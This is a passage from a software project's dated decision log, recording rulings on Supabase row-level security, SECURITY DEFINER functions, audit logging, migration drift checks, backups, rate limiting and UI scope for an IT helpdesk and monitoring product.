row and `with check` against the new one, and neither clause can see the other,
so the tightest expressible pair is the cross product of "old status is one of
these" and "new status is one of those". That cross product permits resolved to
canceled, which the ruling forbids, and it cannot tell a real transition from a
no op.

Reopening settles it beyond argument. The explanation must land as the member's
comment **in the same action**, and two statements from a client are two
statements: a caller can send the status change and never send the comment. No
policy can require the second. One function in one transaction can.

**What that buys, and it is more than convenience.** Members were granted
nothing new on `public.tickets`: no update verb, no column. The migration 005
admin only update policy is untouched and still refuses them. So "every other
column is unreachable through the member path" is not an argument about
predicates being tight enough, it is **the absence of a path**, and the
isolation suite probes it directly by attempting title, status, and the hidden
flag together and finding the row unchanged.

**Internal notes are withheld at the database, never by a screen.**
`ticket_comments.is_internal` is admin only to write (`with check` ties it to
`is_org_admin`) and admin only to read (the member select policy excludes the
rows outright). A member filtering for exactly the withheld rows still gets
nothing, because this is a row filter and not a column mask. The requirement
that there be **no member visible artifact** is asserted the awkward way, on
the count and on the trail, so a placeholder or a gap would fail the test.

**An internal note is not a reply.** `isAwaitingReply` skips it, and the digest
query filters `is_internal = false` at the source because the sweep runs on the
service role where RLS is not in the room. Both guards exist deliberately: an
admin writing a note the requester cannot see has told them nothing, and
counting it would drop the ticket out of the digest while the person who asked
is still waiting. That is the same failure the 2026-07-30 digest ruling exists
to prevent, applied to a new kind of entry.

**The 7 day member window reads the trail, and gets no column.** Every
transition is already recorded in `ticket_events` with its time, so a
`settled_at` column would be a second copy of a fact that can drift from the
first. `terminalTransitionAtMs` reads backwards and stops at the first terminal
arrival, so a ticket resolved, reopened, and resolved again reports the latest
settling, and a ticket whose last transition left a terminal state reports
nothing because it is not settled now. **Admin lists are untouched by all of
it**: every ticket, forever, plus the trail and the audit log. That is the
permanent record and there is no second one.

**Ticket transitions join the audit log**, narrowing the 2026-07-29 ruling that
kept ticket activity in `ticket_events` and out of the org wide log. The reason
that ruling gave no longer holds: a lifecycle transition is now something a
member can do to a shared record, which is the shape of every other action
already in the log. `ticket_canceled` and `ticket_reopened` get their own verbs
because they are the two somebody will one day ask "who did that" about;
everything else is `ticket_status_changed`. Detail carries the ticket id, the
transition, and an actor kind, and **never a title, a comment, or a note**,
asserted by a test that greps the serialized rows.

**Two new SECURITY DEFINER advisories, answered rather than ignored.** The
2026-07-30 entry below said that a fourth advisory would not be covered by it
and would be investigated on its own terms. This is that investigation.
`get_advisors` now reports five, and the two new ones are
`member_set_ticket_status` and `member_hide_ticket`, which are the subject of
this entry. Both are deliberate, both are the reason the feature is safe rather
than a hole in it, and both were verified on the shared project rather than
read off the file: `prosecdef = true`, `proconfig = search_path=""`, execute
revoked from `public` and `anon` and granted to `authenticated`. Definer is not
incidental here. It is what lets a member change a status while holding no
update verb on the table, which is the whole posture. Revoking execute would
remove the only write path a requester has; switching to invoker would make
both functions no ops. The rule from that entry stands unchanged for a sixth.

**Affects.** Anything that adds a status touches the member matrix in
`member_set_ticket_status` and `MEMBER_TRANSITIONS`, and the two must agree or
a screen offers a button the database refuses. Anything that replaces
`tickets_write_event` copies the CURRENT body: this migration nearly dropped
the `created_from_incident` and `created_from_chat` branches by rebuilding the
function from migration 005's text, and the only thing that caught it was an
existing isolation case. The `auto_closed` event type stays in the constraint
because rows written by the old sweep are real history.

---

## 2026-07-30 — Where the build differs from the BRD, written down before the close out

**Decided.** Four places where what shipped is not what `docs/BRD.md` describes
are recorded here as rulings rather than left as undocumented drift. This log
supersedes the BRD where they disagree, so the BRD text stays as written and
these entries are the correction.

**1. F15 shipped as consumables stock, not asset inventory.** BRD F15 asks for
"devices and licenses per org: type, assignee, warranty, notes, CSV import and
export". Migration 016 built something narrower and different in kind: name,
optional org scoped item number, free text serial, location, quantity, minimum
stock, buy link, notes, with low stock derived rather than stored. There is no
device type, no assignee, no warranty date, and no CSV in either direction.

*Why.* The persona that pays for this is a solo consultant restocking toner,
cables, and spare drives, and the question they ask is "what am I about to run
out of". That is a quantity and a threshold. An asset register answers a
different question, "who has which laptop", which needs assignee to mean a
person, warranty to mean a date worth alerting on, and a link to tickets and
monitors for it to earn its keep. Half building it would have produced a table
with fields nobody fills in. Admin only on every verb was the same call: stock
levels are a purchasing matter, not something every member needs on screen.

*Affects.* An asset register is a future feature and not a completion of this
one; it gets its own columns, its own policies, and its own decision entry.
Report F15 as met in the consumables sense and say so, never as the BRD line.
CSV import and export is not deferred work in progress, it is unbuilt.

**2. The role ladder is two roles, and each of the other two has a trigger.**
BRD F1 names owner, admin, technician, and member. Migration 001's check
constraint accepts all four and always has; what the product actually assigns
is two. `src/lib/db/clerk-sync.ts` maps Clerk's `org:admin` to admin and
everything else to member, and there is no in app role management screen, so
owner and technician are reachable only by a hand written database row.

*Why, and what activates each.* Four tiers cost a clause in every policy and a
case in every isolation test, and a solo MSP is all four roles at once, so the
cost is paid before anyone benefits. **Technician activates together with
ticket assignment**, because both answer the same question, whose desk is this
on, and a technician tier with nothing to be assigned is a label. **Owner
activates with billing (F13)**, because that is the first capability that
should belong to one person and not to every admin. Neither is a maybe; both
are named triggers, and when the trigger arrives the tier is built rather than
debated again.

*Affects.* Any surface that reasons about roles today may assume two. The
member settings screen already carries display labels for all four, which is
correct: a hand written technician row must render as Technician, not as a
blank. Report F1 as met for isolation and tenancy, and as two of four roles.

**3. The hard phase gate is retired.** The BRD's risk table (section 14) makes
scope creep's mitigation "phase gates are hard: nothing from Phase 2 starts
until every MVP feature (F1 to F12) is shipped and demoed". F1 to F12 did all
ship first, in order, but F14 and F15 then shipped while F13, the first Phase 2
item by number, has not been started, and the demo the gate names (C3) has not
been recorded yet. The gate as written is therefore not what happened, and
pretending otherwise would be the drift.

*Why.* The BRD contradicts its own gate three rows later in the same table,
which prescribes "retrieval from the org knowledge base (F14) prioritized early
in Phase 2" as the mitigation for AI answers damaging trust. Shipping the AI chat
and then holding back the thing that makes its answers grounded, in order to
build billing for nobody, would have honored the ordering and damaged the
product. F13 also has no customer to bill, and building a billing surface
against zero revenue is the exact scope creep the gate was written to prevent.

*Affects.* Feature order is now argued on merit, one feature per PR, and each
departure from BRD numbering is recorded here. The gate's real intent, that
Phase 2 does not consume the MVP, is still honored and is now the standard;
the numbered ordering is not. A BRD close out reports the MVP against F1 to
F12 and lists F14 and F15 separately as early Phase 2, never blended.

**4. Ticket priority and assignment are deferred until a real queue needs
triage.** BRD F5 asks for "status, priority, comments, internal notes, and
assignment". Tickets shipped with status, comments, and an immutable system
trail. There is no priority column, no assignee, and no separate internal note
type on `public.tickets`.

*Why.* Priority and assignment are triage, and triage is what you build when a
queue is long enough that reading it top to bottom stops working. No org here
has that queue. Shipping them early produces the worst version of both: a
priority field everybody sets to high, and an assignee field that is always the
one admin. Assignment also wants the technician tier to mean something, which
is ruling 2 above, so building it now would force that tier early for no gain.

*Affects.* Both land together with technician when a real queue exists, per the
sketch already in `docs/future_update.md`. Internal notes are a separate
question and stay unbuilt; comments are visible to the submitter by design, and
adding a hidden comment type changes the trail's honesty story, so it needs its
own ruling. Report F5 as met for lifecycle and the trail, not for triage.

---

## 2026-07-30 — The three SECURITY DEFINER advisories are answered, not ignored

**Decided.** Supabase `get_advisors` reports three SECURITY DEFINER warnings on
the shared project. All three name functions this schema built on purpose, each
with a pinned empty `search_path` and grants narrowed to exactly one role. They
are correct as they stand and are not to be "fixed" by a later reader acting on
the lint alone.

**The three, and why each is definer:**

- `status_page_is_public(uuid)`, migration 011, executable by `anon` alone
  (revoked from `public` and `authenticated`). Definer so an anon policy can
  test `organizations.status_page_enabled` without anon ever holding a
  privilege on that column. It returns one boolean about whether an already
  public page is public, so there is nothing to leak.
- `member_audience_tags()`, migration 014, executable by `authenticated` and
  `service_role` (revoked from `public` and `anon`). Definer so the articles
  policy reads the caller's own tags without depending on another table's
  select policy from inside a policy evaluation. It takes no argument, so
  there is no way to point it at another user.
- `org_api_key_providers()`, migration 007, executable by `authenticated`.
  Definer so a member can drive the chat provider picker while holding no
  access to `org_api_keys` at all, not even select. It returns provider names,
  never the key and never its last four.

**Verified on the shared project, not assumed from the files:** all three
report `prosecdef = true` with `proconfig = search_path=""`. An empty
search_path is what stops the definer rights being turned against us by a
caller who controls their own schema path, and it is why every body above
qualifies its tables as `public.`.

**Why the advisory stays.** It is a lint about a shape, not a finding about
these functions, and the shape is deliberate three times over. Revoking execute
would break the status page for anonymous visitors, break article audience
targeting, and break the chat provider picker. Switching them to invoker would
defeat the entire reason each exists.

**Affects.** A future SECURITY DEFINER function is added the same way or not at
all: pinned empty search_path, execute revoked from `public` and every role
that does not need it, a comment saying what it may answer, and an entry here.
**If `get_advisors` ever reports a fourth, it is not covered by this entry and
must be investigated on its own terms.** The audit fanout triggers from
migration 013 are also definer and are correctly absent from this list: a
trigger function is not callable over the REST API, so there is nothing to
revoke.

---

## 2026-07-30 — Platform state gets one table, and the only `using (true)` in the schema

**Decided.** `platform_heartbeat` (migration 018) is a single row table
recording that the cron sweep ran. Its select policy is `using (true)` for both
`authenticated` and `anon`, deliberately, and it is the only table in the
schema permitted that shape.

**Why that is not a shortcut.** The table holds no org data by construction:
one row, no `org_id`, no name, no count belonging to anybody. There is nothing
to scope by, so scoping it would be theatre. The single row is enforced by a
check constraint on the primary key rather than by convention, and the row is
created by the migration with null timestamps so the sweep only ever updates
and nobody needs an insert grant.

**Writes are service role only**, with no policy and no grant for any user
role, the same posture as `incidents.last_notified_at` and
`digest_last_sent_on`. A writable heartbeat would let an admin fake liveness by
stamping it forward, or fake an outage by clearing it, and the entire value of
the number is that the sweep put it there. `anon` is granted only `id`,
`last_run_at`, and `last_success_at`, so the public endpoint cannot leak
operational counts even if its code asked for them.

**Affects.** Any future platform level table follows this file or does not get
created. **If a column is ever proposed for this table that identifies an
organization, this policy becomes wrong and the column belongs in an org scoped
table instead.** The isolation suite asserts the cross org read succeeds *on
purpose*, with a comment, so a later reviewer does not read it as a leak and
"fix" it.

---

## 2026-07-30 — Suppress the verdict when the sweep is stale, never decorate it

**Decided.** When the sweep is stale, the Overview verdict is replaced by an
`unknown` tone, not annotated with a warning. Staleness is checked before the
down branch too.

**Why.** This is the lesson of a real outage. When the sweep stopped, every
monitor kept its `last_status` of up, so the page announced "All systems are
operational" in the largest type on the screen for hours. A claim computed from
data that stopped updating is not a weaker claim, it is a false one, and a
warning stacked beside it still leaves the false claim on the page. A down
monitor observed by a dead sweep is likewise a stale observation, not a current
outage, which is why staleness outranks it.

**Affects.** Any future surface that summarizes monitor state reads freshness
first. `tests/overview.test.ts` carries the regression guard: the page must not
say all is well when nothing has been checked, even with every monitor up.

---

## 2026-07-30 — The freshness endpoint is public, to stop the secret spreading

**Decided.** `/api/ops/heartbeat` is unauthenticated. It answers 200 when the
sweep is fresh and 503 when it is stale, and the GitHub Actions watcher polls
it with `curl --fail`.

**Why not require `CRON_SECRET`.** That was the obvious alternative and it is
rejected for the root cause of the incident this work exists for: the value
already lives in two places that must agree, Vercel and the external scheduler,
and they drifted, which is how monitoring stopped. A third copy in GitHub
secrets makes the next rotation a three way problem and makes the same failure
more likely, not less.

**What is disclosed** is when this platform's own sweep last ran. No tenant is
named, no count is exposed, nothing is writable. The anon column grant from
migration 018 enforces the second of those, not the route handler.

**Affects.** The payload may never grow a field; adding one requires revisiting
this entry. A test asserts the three keys.

---

## 2026-07-30 — Self monitoring is a demo feature, not a watcher

**Decided.** Talvex monitors Talvex and publishes a status page (BRD S5), and
this is recorded as **not** satisfying the need that the external watcher
covers.

**Why it must be said explicitly.** Talvex's own monitors are checked by the
same sweep whose health is in question. When the sweep dies they stop being
checked and the status page freezes showing green, looking most reassuring
exactly when it should not. It catches a dead deployment or a dead database
while the sweep is alive, which is worth having. `.github/workflows/heartbeat.yml`
is the only thing that catches a dead sweep, because it runs somewhere else.

Also accepted: the sweep now checks Talvex from Talvex, so a total outage takes
the checker and the checked together. Inherent to self monitoring anywhere, and
the reason the external watcher is not optional.

**Affects.** A BRD close out reports S5 and the watcher separately and never
lets one stand in for the other. `tests/runbook.test.ts` asserts the runbook
keeps saying so.

---

## 2026-07-30 — Structured logging and an operator channel, instead of Sentry

**Decided.** No Sentry. All logging goes through `src/lib/log.ts`, one line of
JSON with a closed union of event names, enforced by `no-console` in eslint
with that file the single exception. Platform failures additionally post to an
operator owned Discord webhook (`OPS_DISCORD_WEBHOOK`), reusing the hardened
F10 poster.

**Why.** BRD S7 names Sentry, and `@sentry/nextjs` is not one dependency but a
tree, a build plugin, and a client side bundle, for a project that runs on
seven runtime dependencies on purpose and has no customers. It would also place
code in the browser bundle, the one place CLAUDE.md says nothing sensitive may
go. What it actually buys over structured logs is durable retention, and that
is bought instead by posting the lines that matter to a channel the operator
already reads.

Reporting is opt in per call, never automatic: a per org misconfiguration logs
every sweep, so reporting everything would page every five minutes until the
channel was muted, and a muted channel catches nothing.

**Affects.** Any new code logs through `log.ts`. If a real error tracker is
ever warranted, multiple customers or an error nobody can reproduce from logs,
it attaches at that seam and this entry is superseded rather than quietly
ignored. Report S7 as met by structured logging plus the operator sink, not by
the named product.

---

## 2026-07-30 — Rate limits are per instance on purpose, and the status page is limited in the proxy

**Decided.** The shared sliding window (`src/lib/rate-limit.ts`) stays in
memory. `/status/[slug]` is limited in `src/proxy.ts` rather than in the route.

**Why the proxy.** The status page is ISR with `revalidate = 60` and that CDN
cache is the real protection, since most traffic never reaches a function.
Reading request headers inside the route would opt the page out of static
rendering and destroy the thing doing the work. The proxy runs ahead of the
cache and refuses without changing how the page renders. It fails open on any
internal error, because a bug in a limiter must never be why a customer cannot
see whether their systems are up.

**The limitation, accepted rather than papered over.** In memory means per
server instance on Vercel, reset on cold start, and a real ceiling that is a
multiple of the stated number across warm instances. It stops a runaway loop
and a lazy scanner. It is not metering and it does not stop a distributed
attack. Durable limiting needs shared state, meaning a Redis dependency and a
round trip on requests that currently touch nothing.

**Affects.** Revisit at the first paying customer or the first observed abuse,
whichever comes first.

---

## 2026-07-30 — The migration drift guard is never merged over

**Decided.** When the drift guard is red and correct, the fix is to reshape the
work until it goes green. It is never overridden, and a pull request is never
merged past it, even though `migration-drift` is not in the required checks
list and GitHub would permit the merge.

**The case that produced this rule.** Migration 018 was applied to the shared
project ahead of its code, per apply then merge, and its file lived on the
branch carrying that code. Main therefore recorded 17 migrations against a
database that had run 18, and the guard reported version `20260730120000` as
applied with nothing to explain it. That is exactly what the guard is for, and
it stayed red on the first branch in the landing order.

Two wrong answers were available and both were declined: merging with the check
red, on the grounds that it was understood and self resolving, and reordering
the landing so the branch carrying the file went first, which would have
squashed two unrelated pieces of work into one commit. The third answer is the
one taken: a branch containing only the migration file, byte identical to what
the database ran, merged on its own. No code read the table yet, so the file
alone was inert, and the guard went green because the drift genuinely ended.

**Why the rule rather than the judgement call.** A guard overridden once
because the override was defensible is a guard whose next override only has to
be defensible too. The reason this one exists is that the live database was
three migrations behind merged code for a while and nobody knew, which broke
the incident to ticket bridge in production silently. The value is in it being
absolute.

**Affects.** Anything that makes the guard red is a real condition to be fixed,
not a check to be worked around. If the fix is genuinely a ledger repair,
`npx supabase migration repair` is the tool and it gets its own decision entry.

---

## 2026-07-30 — Backups are a drilled `pg_dump`, and S6 is partly unmet on purpose

**Decided.** Point in time recovery is not enabled and cannot be: it is a paid
add on on a paid plan and this Supabase organization is on the free plan. **BRD
S6 is reported as partly met, never green.** RPO is "whenever the operator last
ran `npm run db:dump`".

**What is met** is S6's second clause. The restore procedure is in
`docs/RUNBOOK.md` and has been run once, on 2026-07-30, with the result in
`docs/DEPLOY_LOG.md`. The assertion is not that the restore exited zero but
that the isolation suite passes against the restored data, which exercises
every policy, grant, trigger, and constraint the schema should carry.

**Rejected, and recorded so it is not proposed again as a free win:** automated
dumps into GitHub Actions artifacts. That is a second complete copy of the
tenant database somewhere with weaker access controls and 90 day retention, a
downgrade dressed as progress. `/backups` is gitignored and a test asserts it.

**Affects.** The first real customer triggers both the paid plan and moving
production to its own Supabase project; those two decisions move as a pair.

---

## 2026-07-30 — The daily digest ships ungated; packaging waits for F13

**Decided.** The daily digest is enabled for every organization from the
moment migration 017 lands. Nothing in this PR encodes a plan check: no
entitlement flag, no lock icon, no upgrade prompt, and no plan language in
any copy. The only gate is the one an admin controls, the digest_enabled
toggle in notification settings.

The packaging INTENT is that the digest becomes a paid tier feature when
billing (F13) ships. That intent is recorded here and nowhere else. When F13
arrives it will add the entitlement check in one place; until then, writing a
disabled gate now would mean shipping dead code that reads as a promise.

**Incident alerts stay ungated forever**, regardless of what F13 does to the
digest. An alert that a monitored system is down is the product working, not
a feature tier: an org that cannot be told its site is down is not being sold
a cheaper plan, it is being sold a broken one. Migration 010 already says
this; it is repeated here because F13 will be the moment someone is tempted.

**Why the digest is different.** It is a convenience over data the org can
already see on screens it already has. Withholding it withholds no fact.

**Two smaller rulings made in the same PR**, recorded because both constrain
later work:

*Awaiting a reply counts comments, never status changes.* A ticket's trail
carries comments and system events. Only a comment is a reply; a
status_changed event is bookkeeping. An admin moving a ticket to in_progress
has told the requester nothing, so counting it would silently drop the ticket
out of the digest while the person who opened it is still waiting. Suppressing
is the dangerous direction, so events are skipped and the last comment
decides. A ticket with no comments is awaiting a reply. If a real 'replied'
event type is ever added, this is the function that must learn about it
(isAwaitingReply in src/lib/notifications/digest.ts).

*The ledger records that a day is settled, not that an email was sent.*
digest_last_sent_on is stamped on a quiet day too, when composition produced
nothing. Without that, the digest stays due all day, and an incident opening
at two in the afternoon would fire a "your day" email in the afternoon.
Alerting in the moment is the incident alert's job; the digest is a morning
briefing and stays one.

**Affects.** F13 adds the entitlement check for the digest in exactly one
place and must not touch incident alerts. Anything later that reads a ticket
trail to decide who owes whom a response should reuse isAwaitingReply rather
than restate the rule.

---

## 2026-07-29 — The knowledge base joins the sidebar as Documents, for every role

**Decided.** Reversing the F14 ruling that members reach article reading
through Get Help only: the sidebar entry is renamed Documents and is visible
to every role. Admins land on the management screen exactly as before;
members land on the reading list, the same screen the Get Help door opens,
and that door stays too, so two paths to the same place is intended. User
facing copy says Documents everywhere; route paths, code identifiers, and
the audit action names keep the article vocabulary, because renaming those
would need a migration for zero user value. Why: the thing a member needs
should be one click from anywhere.

---

## 2026-07-29 — The audit log defers ticket and incident fanout to their existing trails

**Decided.** Migration 013's audit fanout covers role, key, monitor, status
page, timezone, and notification settings actions. Ticket and incident
activity stays in ticket_events and incident_events for now; the unified log
consolidates them in a later migration. Accepted at the F12 review.

---

## 2026-07-28 — Status page org enumeration is an accepted residual; migrations 011 and 012 applied together at the F9 close

**Decided.** The enumeration residual in migration 011 is accepted as shipped.
Anyone holding the public key can list the names and slugs of every org that
has enabled its status page, because the anon SELECT policy on organizations
("anon read enabled status page orgs") is table wide, gated only on
`status_page_is_public(id)`, rather than parameterized by the requested slug.

**Why.** Enabling a status page is opting into being public: the page exists
to be shared, and search engines surface the same names and slugs anyway. The
column scoped grants already cap what a listing can reveal to `id`, `name`,
and `status_page_slug`; `url`, `clerk_org_id`, and every other column stay
ungranted, and disabled orgs remain invisible.

**Affects.** Nothing today. The named future mitigation, if enumeration ever
matters: replace the table policy with a slug parameterized SECURITY DEFINER
function, so anon can resolve one known slug to its org but can never list.

**Also recorded here, on migration ordering.** F11 (migration 012, timezone)
merged to main without its apply step, so the shared project sat at migration
010 while main carried 012; the drift guard surfaced the gap during the F9
close, which is the guard working as designed. Both 011 and 012 are applied
together at that close, in filename order, so the applied history stays
ordered, replay from zero stays correct, and nothing needed repair beyond
running the apply.

---

## 2026-07-27 — The sweep runs every 5 minutes from an external scheduler, superseding the daily Vercel cron

**Decided.** The monitor sweep is no longer scheduled by Vercel Cron. An
external scheduler (cron-job.org, configured by hand in its dashboard) invokes
the sweep every 5 minutes. The `crons` block is gone from `vercel.json`. The
contract the scheduler must honor: `POST /api/cron/check-monitors` with an
`Authorization: Bearer <CRON_SECRET>` header, expecting a 200. The route now
exports POST alongside GET (same handler, same auth);
`isAuthorizedCronRequest` already accepted any caller presenting the bearer
token and fails closed without it, so no auth code changed. This supersedes
the 2026-07-23 entry "Monitor checks sweep daily on Vercel Hobby."

**Why.** Notifications (F10) landed. An alert that arrives up to a day after
the outage is not an alert, and the BRD's success metric is failure to ticket
under 90 seconds, which a daily sweep cannot approach. Vercel Hobby hard caps
cron at once per day, so timeliness had to come from outside Vercel; an
external scheduler calling an already authenticated endpoint costs nothing
and changes no application code beyond the POST export.

**Affects.** Confirmation rechecks, incident opens, auto resolves, and ticket
auto closes all tighten from daily to roughly 5 minute granularity with no
code change: the sweep was always granularity agnostic and reads each
monitor's own `interval_seconds`. **The residual:** delivery now depends on a
third party scheduler, and the status of the scheduler itself is unmonitored.
If cron-job.org stops calling, checks quietly stop; nothing watches the
watcher yet. Vercel Pro cron remains the first party alternative if that
residual ever bites.

---

## 2026-07-27 — The landing page is built now, and a master design document is the design entry point

**Decided.** The public landing page (`/`) is implemented ahead of schedule,
superseding the 2026-07-23 decision to hold it until the end of the MVP. A new
master design document, [`docs/design/DESIGN.md`](design/DESIGN.md), is now the
single entry point for the design system and screen inventory; the existing
handoffs and this log sit beneath it.

**Why.** The landing design was finished and the owner chose to ship it. It cost
little: the design was derived from the same token system the app already uses,
so it reused the palette wholesale and added only landing-specific chrome
(`.liquid-glass`, `.landing-frame`, `.landing-panel`, the hero video/overlay), a
`General Sans` display face, and one CTA shadow token. With auth, dashboard, Help,
and now landing all built, a master document was needed so the design is
discoverable from one place rather than scattered across handoffs.

**Affects.** `src/app/page.tsx` is now the real landing page (client
`_landing/hero-background.tsx` for the muted background video), not a placeholder.
General Sans is self hosted in `src/lib/fonts/`. The marketing copy only
advertises what ships: the alert channels are Email, Discord, and recovery
alerts, matching BRD F10 — **not** SMS or quiet hours, which are not built, and
which the earlier draft wrongly promised. Product shots are the real
`dashboard-home-dark` / `get-help-dark` screenshots. `tests/design-tokens.test.ts`
still passes unchanged; no new colour tokens were needed.

---

## 2026-07-25 — The product is dark only; light mode removed

**Decided.** Talvex ships dark only. The light theme, the theme toggle, and the
pre paint theme script are gone; `data-theme="dark"` is set statically on
`<html>`, and the `:root` tokens in `src/app/globals.css` are the single palette.
This supersedes the 2026-07-24 decision that kept light mode in scope.

**Why.** The design is dark first, and light mode caused two real problems: a
visitor on a light mode OS saw a washed out light adaptation instead of the
intended design, and every surface carried a second set of token values plus
`[data-theme="light"]` overrides that had to stay correct. Removing light
collapses the theme system to one palette and deletes a class of failure modes.
Alongside it, the fragile arbitrary utilities (`shadow-[var(--shadow-card)]`,
`animate-[fadeUp…]`, `bg-[image:var(--accent-gradient)]`) became first-class
`@theme` utilities (`shadow-card`, `animate-fade-up`, `animate-pulse-dot`,
`bg-accent-gradient`), so Tailwind v4 under Turbopack emits them deterministically
and the dev stylesheet stops going stale as screens are added — which is what
made the running app look unstyled while the production build was correct.

**Affects.** There is no `[data-theme="light"]` anywhere; `tests/design-tokens.test.ts`
runs its AA and reserved color checks for the dark palette only. The auth screens
are dark only too (no toggle). If light mode is ever wanted again it is fresh,
deliberate work, not a maintained overlay.

---

## 2026-07-24 — Light mode stays in scope; every design token carries both themes, guarded in both

**Decided.** Light mode is a supported, in scope mode of the product, not a
deferred idea. The design handoff prototype was authored dark only and its
README called light mode "never designed" (open question 1); that framing is
stale against this codebase. Light mode already ships here: the theme toggle,
the pre paint theme script, Clerk theming, and light screenshots for every
screen. Every design token added from here on gets values in both the dark
`:root` and the `[data-theme="light"]` override, and `tests/design-tokens.test.ts`
asserts WCAG AA on the text pairs in both themes. Wiring a token dark only
would silently regress a live feature, so it is not allowed.

**Why.** The reskin adds a batch of tokens (flat card surface, dividers,
tiles, secondary and chip text, status washes, card shadow, a fuller type and
radius scale, a glass chrome class). Treating light as out of scope, as the
prototype implies, would have let those tokens ship without light values and
without contrast coverage, breaking the light theme that users already have.
The honest reading is that the prototype is behind the repo, not that the repo
should follow the prototype. The handoff README was reconciled to say so
rather than implemented against.

**Affects.** Adding or changing a color or surface token means providing both
theme values; adding a text token means adding its pair to the AA test so both
themes are guarded. Naming stays semantic; see the tokens in
`src/app/globals.css`.

**Status washes are a sanctioned exception to the reserved color rule.** The
fills `--wash-up`, `--wash-down`, and `--wash-accent` are translucent tints
derived from the status colors, so they are green and red on purpose. They stay
rgba because a wash needs alpha; that is the correct value format, not a way
around the guard. The tokens test now scans rgba as well as hex and permits
these tokens by name, so a colored value can no longer hide behind the alpha
syntax. The guard came out stricter, not quieter.

---

## 2026-07-24 — The Get help route is /dashboard/help, with a permanent redirect from the old path

**Decided.** The end user help feature lives at `/dashboard/help` (and
`/dashboard/help/ticket`). It was previously `/dashboard/get-help`. A permanent
redirect in `next.config.ts` sends `/dashboard/get-help/:path*` to
`/dashboard/help/:path*` so the old path keeps working. The feature's visible
name stays "Get help"; only the route path changed.

**Why.** The redesign begins here, and the route rename lands first so the
design PRs that follow all target one stable path. `help` reads cleaner in the
URL, matches how the nav and pages already speak ("Get help" the action, "help"
the place), and drops the hyphen from the path. The redirect is permanent
because the old path may already be bookmarked or linked, and a design reskin
should not break a link someone saved.

**Affects.** New links point at `/dashboard/help`. The eight internal
references (layout nav, the two tickets page buttons, the incident detail
create ticket href, the chat and tickets action redirects, and the two help
page internal links) were updated in one move. Anything added later should use
the new path; the redirect covers stragglers, not new code.

---

## 2026-07-24 — CI fails a build when a merged migration is not applied to the shared project

**Decided.** A third CI job, `migration-drift`, compares three sets on every
pull request and every push to main: the migration versions on the base branch,
the versions in the checkout, and the versions the shared Supabase project
records in `supabase_migrations.schema_migrations`. A migration that is already
merged but not applied fails the build. So does a version the database records
that no file in the repository explains.

**Why.** Twice in two days, merged code assumed schema the live database did not
have, and the first symptom both times was a 500 in front of a user
(docs/DEPLOY_LOG.md, Phase 1 Task 5). A migration file is a promise; nothing was
checking that the promise was kept. Reviewers cannot see the state of a database
in a diff, so the check has to be mechanical.

**What it deliberately does not do.** It never fails a PR for the migration that
PR adds. That migration has not merged, so it is not yet a promise; it is
reported as pending instead. Only the base branch's migrations are held to the
standard, which is what makes drift catchable before merge rather than after.
The implied workflow is apply, then merge: apply the new migration to the shared
project while the PR is open (the guard then reports it as already applied), so
main is never briefly ahead of the database.

**Affects.** The comparison lives in `scripts/check-migration-drift.mjs` as a
pure function, unit tested in `tests/migration-drift.test.ts`, with git and psql
supplying the real readings in CI. The job needs one repository secret,
`SUPABASE_DB_URL`, set on 2026-07-24; the guard has been armed since, with no
`--allow-unconfigured` escape hatch. A missing or broken secret now fails the
job rather than warning, because a guard that quietly stops guarding is worse
than no guard: it reads as "no drift" when it means "not checked".

**Use the session pooler string, not the direct connection.** Direct connections
(`db.<ref>.supabase.co`) are IPv6 only and GitHub Actions runners are IPv4 only,
so the direct string fails to connect on every run. That failure looks different
from a drift failure, which is the point: connection problems say so.

---

## 2026-07-24 — The remote migration history was repaired to match the local files, which are the source of truth

**Decided.** The shared project's `supabase_migrations.schema_migrations` was
rewritten so its versions match `supabase/migrations/` exactly: the five drifted
stamps (001 to 004 and 006) were moved onto their local file versions, and 007
and 008, applied by hand in the SQL editor and never recorded, were inserted.
Where the two disagreed, the file won.

**Why.** The drift is what made `supabase db push` unusable, which is what
forced every migration to production through the SQL editor by hand, which is
what caused the drift. Breaking that loop is the precondition for the guard
above being anything other than a permanently red check.

**How, and what was not touched.** The repair was `update` on the `version`
column plus two inserts, not delete and reinsert, so the recorded `statements`
(what actually ran, in some cases retyped rather than pushed) survive as
forensic history. No schema, no policy, and no row outside the history table
changed. Before stamping 007 and 008 applied, their objects were verified
present on the remote: both tables, all four policies, every function, the
`tickets.conversation_id` column and the `tickets_single_origin` constraint.

**Affects.** `db push` is now the way schema reaches production. The SQL editor
dance is retired; using it again recreates exactly the state this repaired.

---

## 2026-07-24 — Migrations 001 and 002 carry explicit GRANTs; auto exposure is gone

**Decided.** Migration 009 backfills the table and function grants that
`organizations`, `org_members`, `clerk_active_org_id()` and
`clerk_is_org_admin()` never had, completing the 2026-07-23 GRANTs decision.
`auto_expose_new_tables` is removed from supabase/config.toml, ahead of its
2026-10-30 upstream removal. Every table and function in the schema now states
its own privileges.

**Why it mattered more than bookkeeping.** Auto exposure had granted ALL
privileges to `anon` **and** `authenticated` on both tables. Only RLS stood
between an anonymous caller and a write, because neither table has a single
policy naming anon. That was one policy mistake away from being real, and it
would have failed closed in the other direction on 2026-10-30, when both tables
would have silently stopped being reachable.

**The judgement call.** The backfill preserves migration 001's stated intent
rather than tightening past it: admins keep the insert and update on
`org_members` that 001's policies were written for, narrowed to columns
(`role` on update, so a role can be corrected but a membership cannot be
reassigned to another person or another org). Narrowing grants is not licence to
quietly remove a capability the schema already granted; that would be a
behavior change wearing a housekeeping label.

**Affects.** `tests/isolation/org-table-grants.test.ts` proves the verb layer:
anon is refused outright (42501, not an empty array), organizations is read only
for every session, membership deletion is webhook only, and a signed in session
still reads its own org, which guards the EXECUTE revoke on the claim helpers
from failing every policy closed. The local stack now proves the grants are
complete on every `db reset`: without auto exposure, a table whose migration
forgets its GRANTs fails the isolation suite immediately.

---

## 2026-07-24 — Support chat is a workplace record, admin visible, and disclosed, superseding the personal privacy default

**Decided.** Chat conversations and their messages are org visible workplace
records, not private to the person who wrote them. Org admins (per
`org_members.role`) can read every conversation in their org; a member reads
only their own. This supersedes the personal privacy default considered during
design (that a chat would be private to its author). The chat surface carries
one quiet, honest line stating it: "Conversations are visible to your IT team."

**Why.** The chat is first line IT support inside a workplace, not a personal
assistant. The team that fixes the problem needs to see what was asked and what
the assistant advised, the same way they see tickets. Hiding transcripts from
admins would break escalation (the ticket's reference card links through to the
full transcript as the source of truth) and would be dishonest by omission. The
right answer is disclosure, not secrecy: tell people plainly, once, on the
surface, and make the record useful.

**How it is encoded.** `chat_conversations` select policy is exactly the ticket
shape: `created_by = clerk_user_id() or is_org_admin(org_id)`, org scoped.
